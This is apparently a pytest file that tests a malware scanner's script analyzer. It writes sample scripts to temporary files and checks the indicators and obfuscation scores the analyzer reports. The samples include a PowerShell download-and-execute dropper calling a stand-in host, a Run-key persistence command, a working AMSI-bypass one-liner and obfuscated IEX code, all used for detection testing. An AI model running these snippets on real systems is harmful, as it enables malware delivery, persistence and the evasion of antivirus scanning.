"""Tests for ScriptAnalyzer behavior."""

from __future__ import annotations

from pathlib import Path

import pytest
from malscan_worker.analyzers.script_analyzer import ScriptAnalyzer
from malscan_worker.stages.base import StageContext


def _ctx(file_path: Path) -> StageContext:
    return StageContext(
        job_id="job-1",
        file_id="file-1",
        storage_key="key",
        sha256="0" * 64,
        original_filename=file_path.name,
        file_path=file_path,
    )


@pytest.mark.parametrize(
    ("name", "mime", "content"),
    [
        ("sample.ps1", "text/plain", "Write-Host 'ok'\n"),
        (
            "sample.js",
            "text/plain",
            "function run(){var x=1;WScript.Shell.Run('cmd /c whoami');}\n",
        ),
        (
            "sample.vbs",
            "text/plain",
            'Dim o\nSet o = CreateObject("WScript.Shell")\no.Run "cmd /c dir"\n',
        ),
        ("sample.bat", "text/plain", "@echo off\nset A=1\ncmd /c whoami\n"),
        (
            "sample.hta",
            "text/html",
            "<html><head><HTA:APPLICATION></head><script language='VBScript'>"
            'MsgBox "x"</script></html>',
        ),
    ],
)
def test_can_handle_known_script_extensions(
    tmp_path: Path,
    name: str,
    mime: str,
    content: str,
) -> None:
    file_path = tmp_path / name
    file_path.write_text(content)

    analyzer = ScriptAnalyzer()

    assert analyzer.can_handle(file_path, mime, content.encode("utf-8")[:32]) is True


def test_can_handle_content_sniff_path_for_untyped_file(tmp_path: Path) -> None:
    file_path = tmp_path / "payload.dat"
    content = "powershell -ExecutionPolicy Bypass -Command Invoke-WebRequest https://example.test/a"
    file_path.write_text(content)

    analyzer = ScriptAnalyzer()

    assert analyzer.can_handle(file_path, "application/octet-stream", b"\n") is True


def test_can_handle_utf16le_bom_powershell(tmp_path: Path) -> None:
    file_path = tmp_path / "utf16.ps1"
    content = "Write-Host 'ok'\nStart-Sleep 1\n"
    raw = content.encode("utf-16")
    file_path.write_bytes(raw)

    analyzer = ScriptAnalyzer()

    assert analyzer.can_handle(file_path, "text/plain", raw[:32]) is True


def test_can_handle_rejects_binary_and_non_script(tmp_path: Path) -> None:
    binary_path = tmp_path / "blob.bin"
    binary_path.write_bytes(b"\x00\x89\x90\x81\x00\x00\xff\x10")

    text_path = tmp_path / "notes.txt"
    text_path.write_text("hello world this is plain text")

    analyzer = ScriptAnalyzer()

    assert (
        analyzer.can_handle(binary_path, "application/octet-stream", binary_path.read_bytes())
        is False
    )
    assert analyzer.can_handle(text_path, "text/plain", b"hello world") is False


@pytest.mark.asyncio
async def test_analyze_simple_powershell(tmp_path: Path) -> None:
    file_path = tmp_path / "simple.ps1"
    file_path.write_text("Write-Host 'ok'\nStart-Sleep 1\n")

    analyzer = ScriptAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.analyzer_name == "script"
    assert result.format_type == "SCRIPT"
    assert result.features["script_type"] == "powershell"
    assert result.features["line_count"] == 2
    assert isinstance(result.features["obfuscation_score"], int)
    indicator_types = {str(ind["type"]) for ind in result.indicators}
    assert "sleep_or_delay" in indicator_types


@pytest.mark.asyncio
async def test_analyze_utf16_powershell_basic_features(tmp_path: Path) -> None:
    file_path = tmp_path / "utf16-basic.ps1"
    content = "Write-Host 'ok'\nStart-Sleep 2\n"
    file_path.write_bytes(content.encode("utf-16"))

    analyzer = ScriptAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.errors == []
    assert result.features["script_type"] == "powershell"
    assert result.features["line_count"] == 2
    obf = result.features["obfuscation_score"]
    assert isinstance(obf, int)


@pytest.mark.asyncio
async def test_download_and_execute_indicator(tmp_path: Path) -> None:
    file_path = tmp_path / "dropper.ps1"
    file_path.write_text(
        "Invoke-WebRequest https://example.test/payload.exe -OutFile payload.exe\n"
        "Start-Process payload.exe\n"
    )

    analyzer = ScriptAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicators = {str(ind["type"]): ind for ind in result.indicators}
    assert "download_and_execute" in indicators
    assert str(indicators["download_and_execute"]["severity"]) == "critical"


@pytest.mark.asyncio
async def test_obfuscation_score_behavior(tmp_path: Path) -> None:
    clear_file = tmp_path / "clear.ps1"
    clear_file.write_text("Write-Host 'hello'\nGet-Date\n")

    obf_file = tmp_path / "obf.ps1"
    encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=="
    obf_file.write_text(
        "$x=[Convert]::FromBase64String('"
        + encoded
        + "')\n"
        + "$y=[String]::Join('',(65,66,67)|%{[char]$_})\n"
        + "IEX ($y -join '')\n"
        + ("`^" * 320)
        + "\n"
    )

    analyzer = ScriptAnalyzer()
    clear_result = await analyzer.analyze(clear_file, _ctx(clear_file))
    obf_result = await analyzer.analyze(obf_file, _ctx(obf_file))

    clear_raw = clear_result.features["obfuscation_score"]
    obf_raw = obf_result.features["obfuscation_score"]
    assert isinstance(clear_raw, int)
    assert isinstance(obf_raw, int)
    clear_score = clear_raw
    obf_score = obf_raw
    assert obf_score > clear_score


@pytest.mark.asyncio
async def test_registry_persistence_indicator(tmp_path: Path) -> None:
    file_path = tmp_path / "persist.ps1"
    file_path.write_text(
        "Set-ItemProperty -Path HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "-Name Updater -Value C:\\Temp\\updater.exe\n"
    )

    analyzer = ScriptAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicators = {str(ind["type"]): ind for ind in result.indicators}
    assert "registry_persistence" in indicators
    assert str(indicators["registry_persistence"]["severity"]) == "high"


@pytest.mark.asyncio
async def test_amsi_bypass_indicator(tmp_path: Path) -> None:
    file_path = tmp_path / "amsi.ps1"
    file_path.write_text(
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')."
        "GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
    )

    analyzer = ScriptAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    indicators = {str(ind["type"]): ind for ind in result.indicators}
    assert "amsi_bypass" in indicators
    assert str(indicators["amsi_bypass"]["severity"]) == "high"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("name", "content", "expected_type", "expected_feature_key"),
    [
        (
            "script.js",
            "var x = new ActiveXObject('WScript.Shell'); x.Run('cmd /c whoami');",
            "javascript",
            "exec_operations",
        ),
        (
            "script.vbs",
            'Set w = CreateObject("WScript.Shell")\nw.Run "cmd /c whoami"',
            "vbscript",
            "exec_operations",
        ),
        (
            "script.bat",
            "@echo off\nset a=1\ncmd /c whoami\n",
            "batch",
            "exec_operations",
        ),
    ],
)
async def test_js_vbs_batch_analysis_paths(
    tmp_path: Path,
    name: str,
    content: str,
    expected_type: str,
    expected_feature_key: str,
) -> None:
    file_path = tmp_path / name
    file_path.write_text(content)

    analyzer = ScriptAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.features["script_type"] == expected_type
    feature_values = result.features[expected_feature_key]
    assert isinstance(feature_values, list)
    assert feature_values
